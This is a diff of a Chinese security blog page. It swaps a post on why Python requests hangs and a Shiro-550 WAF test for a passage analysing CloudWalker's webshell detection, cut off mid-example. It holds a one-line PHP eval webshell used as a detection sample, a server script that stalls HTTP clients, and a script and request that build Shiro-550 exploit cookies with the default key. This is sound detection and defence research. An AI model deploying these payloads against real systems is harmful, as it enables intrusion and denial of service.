@@ -125,7 +125,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">46</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -168,7 +168,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -181,7 +181,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/" class="post-title-link" itemprop="url">requests.get卡住</a>
+          <a href="/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">webshell检测总结与实例分析</a>
         </h2>
 
         <div class="post-meta-container">
@@ -205,176 +205,104 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前线上的漏洞扫描遇到一个奇怪的问题:requests.get即使设置了timeout，仍然卡住。</p>
-<p>看lijiejie大佬 <a target="_blank" rel="noopener" href="http://www.lijiejie.com/requests-get-hang/">requests.get 异常hang住</a> 也碰到过这个问题。</p>
-<p>所以，我想要探究以下问题:</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>很久之前做过<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/161ffd8e918d70b5029ab828333837c9">webshell检测方案调研</a>，webshell可以在流量安全产品（比如waf、nids）和主机安全产品（hids）检测。</p>
+<p>在流量安全产品常见的检测场景包括：</p>
 <ul>
-<li>requests库中timeout参数的具体含义是什么?</li>
-<li>为什么requests.get时timeout参数”失效”?</li>
+<li>文件上传接口，比如检查上传的文件名、文件内容</li>
+<li>webshell访问，比如检查常见的webshell管理工具</li>
 </ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="requests库中timeout参数的具体含义是什么"><a href="#requests库中timeout参数的具体含义是什么" class="headerlink" title="requests库中timeout参数的具体含义是什么?"></a>requests库中timeout参数的具体含义是什么?</h2><ul>
-<li><p>requests库中timeout参数是什么?</p>
-<p>根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
-</li>
-<li><p>什么是connect超时?</p>
-<p>客户端需要connect系统调用来和服务端做tcp三次握手，当服务地址在互联网上不存在时，connect系统调用耗时就会比较长。</p>
-<p>比如请求1.1.2.3 过一段时间后会返回一个connect tiemout:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;)&#39;</span><br></pre></td></tr></table></figure>
-
-<p>在上面请求1.1.2.3这个不存在的ip时，客户端发出的 syn 包没有任何响应，于是客户端会重传syn包</p>
+<p>在主机安全产品常见的检测场景包括：</p>
 <ul>
-<li>重传次数在 /proc/sys/net/ipv4/tcp_syn_retries 可以配置</li>
-<li>重传间隔时间并不是固定的，在Linux系统上测试结果是 [1,3,7,15,31]s，似乎就是 2^(n+1)-1</li>
+<li>文本内容，比如检查所有php文件是否webshell</li>
+<li>内存马</li>
 </ul>
-<p>如果重试完后仍然没有收到ack包，就会出现connect timeout</p>
-<p>而request的timeout参数就可以减少这个等重传的时间。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;, timeout&#x3D;(1, 100))&#39; # 1s的connect超时设置</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么实现的connect超时控制?</p>
-<p>connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢?</p>
-<p>在Modules/socketmodule.c可以找到connect函数的实现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>
-
-<p>流程如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 设置socket为非阻塞模式后，调用connect系统调用</span><br><span class="line">* 使用poll系统调用来判断是否超时</span><br></pre></td></tr></table></figure>
-
-<p>实际上这是一种很通用的对connect做超时控制的方式，在其他tcp客户端中也可以这么实现超时控制。</p>
-</li>
-<li><p>什么是read超时?</p>
-<p>客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
-<p>比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
-<p>客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h2 id="为什么requests-get时timeout参数”失效”"><a href="#为什么requests-get时timeout参数”失效”" class="headerlink" title="为什么requests.get时timeout参数”失效”?"></a>为什么requests.get时timeout参数”失效”?</h2><p>  requests.get在 dns解析、connect、read 这些阶段都有可能耗时比较久。下面分别说一下timeout在这三个阶段中是否生效。</p>
-<p>  文档中只说了timeout控制connect、read两个阶段，说明dns解析耗时很久时timeout是管不了的。<br>  我自己实验，也得出相同的结论：dns解析时间即使超过timeout，也不会抛出异常。</p>
-<p>  connect阶段在上面已经分析过，timeout是可以控制这一阶段最多花费多长时间的。</p>
-<p>  Python中的read超时不是一个全局的时间，它只是在每一次读socket时不能超过这个时间。而一次响应的读取可能有多次read操作。这儿可能和其他的http客户端（比如curl）等超时时间含义不同。</p>
-<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过read timeout值，这个时候客户端会卡住。</p>
-<p>  所以，在下面两种情况下是会造成read timeout参数“失效”的:</p>
+<p>根据网络上公开资料总结，”文本内容”检测手段包括：<br>| webshell检测技术 | 举例<br>| - | - |<br>| 动态分析-沙箱 | <a target="_blank" rel="noopener" href="https://scanner.baidu.com/#/pages/intro">百度webdir</a> |<br>| 静态分析-正则 |<br>| 静态分析-统计学角度 |<br>| 静态分析-AST |<br>| 机器学习/深度学习 |<br>| RASP | <a target="_blank" rel="noopener" href="https://rasp.baidu.com/doc/dev/official.html">百度OpenRASP</a> |</p>
+<p>长亭开源的<a target="_blank" rel="noopener" href="https://github.com/chaitin/cloudwalker">cloudwalker</a>检测方式较全，个人觉得值得学习。</p>
+<p>本文简要分析cloudwalker的检测手段，应该适合正在调研webshell检测方案的读者阅读。</p>
+<blockquote>
+<p>PS: p牛说他们目前的方案已经和开源版本有非常大的不同，目前方案的线上demo：<a target="_blank" rel="noopener" href="https://forum.xray.cool/webshell">https://forum.xray.cool/webshell</a></p>
+</blockquote>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ul>
+<li><p>cloudwalker是什么？</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651372030&idx=1&sn=682c49b3decda87ddf0ed641d5d347c6&chksm=8d39c876ba4e4160e88bacf0ffc3cadc39b60a269a6facec9f62134823af829624e42df52376&token=496332164&lang=zh_CN">牧云（CloudWalker）开源手记 | Webshell 监控检测策略初探</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/45796590">牧云（CloudWalker）开源|如约而至: Webshell核心检测引擎</a></p>
+<p>这两篇官方文章其实已经把检测策略介绍过了，总结起来包括四类：</p>
 <ul>
-<li><p>响应中content-length是一个特别大的数，服务端缓慢的每次响应1字节</p>
-</li>
-<li><p>服务端返回的响应码是100，同时服务端持续不断地返回响应头，也会导致客户端持续不断的read</p>
-<p>比如下面的服务端持续不断地返回响应头，会导致客户端卡住。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from socket import *</span><br><span class="line">from multiprocessing import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def dealWithClient(newSocket,destAddr):</span><br><span class="line">    recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">    newSocket.send(b&quot;&quot;&quot;HTTP&#x2F;1.1 100 OK\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">        newSocket.send(b&quot;&quot;&quot;x:a\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">        if len(recvData)&gt;0:</span><br><span class="line">            # print(&#39;recv[%s]:%s&#39;%(str(destAddr), recvData))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;[%s]close&#39;%str(destAddr))</span><br><span class="line">            sleep(10)</span><br><span class="line">            print(&#39;over&#39;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    # newSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    serSocket &#x3D; socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)</span><br><span class="line">    localAddr &#x3D; (&#39;&#39;, 8085)</span><br><span class="line">    serSocket.bind(localAddr)</span><br><span class="line">    serSocket.listen(5)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            newSocket,destAddr &#x3D; serSocket.accept()</span><br><span class="line"></span><br><span class="line">            client &#x3D; Process(target&#x3D;dealWithClient, args&#x3D;(newSocket,destAddr))</span><br><span class="line">            client.start()</span><br><span class="line"></span><br><span class="line">            newSocket.close()</span><br><span class="line">    finally:</span><br><span class="line">        serSocket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>更多的讨论可以见提交的bug <a target="_blank" rel="noopener" href="https://bugs.python.org/issue44022">urllib http client possible infinite loop on a 100 Continue response</a></p>
+<li>基于模糊哈希</li>
+<li>基于模糊正则</li>
+<li>基于代码风格</li>
+<li>基于机器学习：模型使用svm，特征包括了三个维度（代码风格、操作序列、操作名）</li>
+</ul>
 </li>
 </ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>请求在 dns解析、connect、read 这些阶段都有可能耗时很久，其中：</p>
-<ul>
-<li>dns解析阶段 不受timeout参数控制</li>
-<li>connect阶段 受timeout参数控制</li>
-<li>read阶段 timeout不是全局的，如果服务端让客户端有很多次read操作，就有可能让客户端卡住</li>
+<h2 id="模糊哈希"><a href="#模糊哈希" class="headerlink" title="模糊哈希"></a>模糊哈希</h2><ul>
+<li><p>是什么？</p>
+<p>用<code>ssdeep</code>命令来实践，看一下生成的模糊哈希。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@vm10-50-0-18 ssdeep_test]# ssdeep &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;usr&#x2F;bin&#x2F;sleep1 -s</span><br><span class="line">ssdeep,1.1--blocksize:hash:hash,filename</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep1&quot;</span><br><span class="line">[root@vm10-50-0-18 ssdeep_test]# echo 11 &gt;&gt; &#x2F;usr&#x2F;bin&#x2F;sleep1</span><br><span class="line">[root@vm10-50-0-18 ssdeep_test]# ssdeep &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;usr&#x2F;bin&#x2F;sleep1 -s</span><br><span class="line">ssdeep,1.1--blocksize:hash:hash,filename</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7B:O35Q2Vo5FWkfJ8nXX7B,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，<code>/usr/bin/sleep1</code> 在添加了两个字节的数据后，算出来的模糊哈希虽然和原来的不同，但是很相似。</p>
+<p>所以可以得出结论：如果文件的”模糊哈希”相似，就很可能文件内容非常相似。</p>
+</li>
+<li><p>cloudwalker怎么用”模糊哈希”检测webshell？</p>
+<p>在 tool/webshell-detector/bin/static/model-latest/SampleHash.txt 文件有计算好的”webshell模糊哈希列表”</p>
+<p>在检测文件时，先计算出”检测对象”的模糊哈希，然后和”webshell模糊哈希列表”做相似度比较</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201021_0352ba68_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+</li>
 </ul>
-<p>阻塞时的connect系统调用是有默认的最大时间限制，这个和系统配置有关；可以用”非阻塞connect+select/poll”来实现connect的超时控制。</p>
-<p>在排查这个case原因时，发现这里存在潜在的dos攻击问题，也上报给Python官方，很快被修复了。</p>
+<h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><ul>
+<li><p>是什么？</p>
+<p>从代码字符串中统计出的如下信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* WM：代码中的单词总数</span><br><span class="line">* LM：代码行数</span><br><span class="line">* SPL：代码中的分号数量&#x2F;总行数</span><br><span class="line">* SR：符号比例 &#x3D; 符号长度&#x2F;总长度</span><br><span class="line">* ...</span><br></pre></td></tr></table></figure>
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/" class="post-title-link" itemprop="url">从shiro-550漏洞品阿里云waf规则引擎</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。</p>
-<p>也有人整理出常见的aes加密密钥 top100 来利用此漏洞。</p>
-<p>如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：</p>
-<ol>
-<li>根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截</li>
-<li>先base64解码，然后aes解密，最后规则匹配原始payload</li>
-</ol>
-<p>第二个方法存在两个问题：</p>
-<ol>
-<li><p>aes解密时密钥是啥？会把top100利用时的密钥全部覆盖？</p>
+<p>这一部分业务逻辑在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/src/Stat.go">Stat.go</a></p>
 </li>
-<li><p>这个方法想起来简单，但是实施起来并不简单。它需要规则引擎支持base64解码和aes解密，并且需要规则中能够很容易描述这个解码顺序。</p>
-<p> 按照我的理解，waf和poc扫描的规则引擎类似，都支持规则描述文件和代码实现方式两种。如果waf规则引擎只支持规则描述文件的形式，不支持用代码来描述防护规则，那写这么一条规则我觉得还挺费劲的。</p>
+<li><p>cloudwalker怎么用”代码风格”检测webshell？</p>
+<p>在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/bin/static/config/statState.json">statState.json</a> 中允许用户配置”代码风格合理范围”。cloudWalker计算出”检测对象”的”代码风格”后，会检查是否在此范围内。</p>
+<p>另外，”代码风格”信息会作为机器学习模型中的特征。</p>
 </li>
-</ol>
-<p>下面就是我验证阿里云waf是怎么拦截防护shiro-550漏洞的。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>测试payload使用下面脚本生成，其中key使用shiro-550默认key</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Python2</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">BS &#x3D; AES.block_size</span><br><span class="line">mode &#x3D; AES.MODE_CBC</span><br><span class="line">iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s): return s + ((BS - len(s) % BS)</span><br><span class="line">                    * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_shiro_payload(rememberMe):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	打印 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;&quot; 生成的payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	# rememberMe &#x3D; &quot;&quot;&quot;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxq&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; encryptor.decrypt(base64.b64decode(rememberMe))</span><br><span class="line">	print(data)</span><br><span class="line">	print(len(data))</span><br><span class="line"></span><br><span class="line">def encrypt_shiro_payload(originalPayload):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	originalPayload 是 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;http:&#x2F;&#x2F;xxx&quot; 生成的payload</span><br><span class="line"></span><br><span class="line">	打印payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	data &#x3D; base64.b64encode(encryptor.encrypt(pad(originalPayload)))</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	encrypt_shiro_payload(&quot;111111&quot;*400)</span><br></pre></td></tr></table></figure>
+</ul>
+<h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
+<li><p>cloudwalker怎么用”机器学习”检测webshell？</p>
+<p>使用了两层的机器学习。</p>
+<p>第一层模型使用svm算法，特征包括三类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 前面说的&quot;代码风格&quot;</span><br><span class="line">* &quot;操作序列模型&quot;的预测结果</span><br><span class="line">* &quot;操作名称模型&quot;的预测结果</span><br></pre></td></tr></table></figure>
 
-<ol>
-<li><p>测试攻击请求</p>
-<p> 原始payload是利用ysoerial工具生成： java8 -jar scripts/third_party/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS “”</p>
-<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密→base64编码</p>
-<p> 发送请求后，阿里云waf拦截</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx.com</span><br><span class="line">User-Agent: curl&#x2F;7.70.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: rememberMe&#x3D;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxp</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201048_9220c5df_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
 </li>
-<li><p>测试正常请求</p>
-<p> 原始payload是 “111111”*400 ，不包含攻击特征。</p>
-<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码</p>
-<p> 结论：正常请求阿里云waf未拦截</p>
+<li><p>“操作序列模型”是什么？</p>
+<p>训练好的模型在 tool/webshell-detector/bin/static/model-latest/OpSerial.model</p>
+<p>它使用svm算法，特征是”操作序列”处理后的数据。</p>
+<p>“操作序列”包含了php代码中的”操作特征”。</p>
 </li>
-</ol>
-<p>对比拦截和不拦截的情况，可以看出来阿里云waf防护防护规则逻辑：先对cookie中的rememberMe做base64解码，然后用默认key(kPH+bIxk5D2deZiIxcaaaA==”) 来做aes解密，最后规则匹配解密后的内容。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有一些测试在分析过程中没有写，这里直接写出结论：</p>
-<ol>
-<li>阿里云waf仅尝试使用一个默认key来解密。（应该是性能考虑）</li>
-<li>不能根据rememberMe的值过长来拦截，因为正常业务这个值也可能有500+个字节长度。</li>
-</ol>
-<p>虽然不能完全防御shiro-100key扫描，但是阿里云waf这条规则还是挺细致的。从支持rsa解密这一点上感觉背后的规则引擎功能很丰富。</p>
+<li><p>怎么生成”操作序列”？</p>
+<p>由代码获取到抽象语法树后，再由抽象语法树生成”操作序列”。</p>
+<p>举个例子：</p>
+<p>假设待检测的php代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[0]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码生成的抽象语法树（ast）</p>
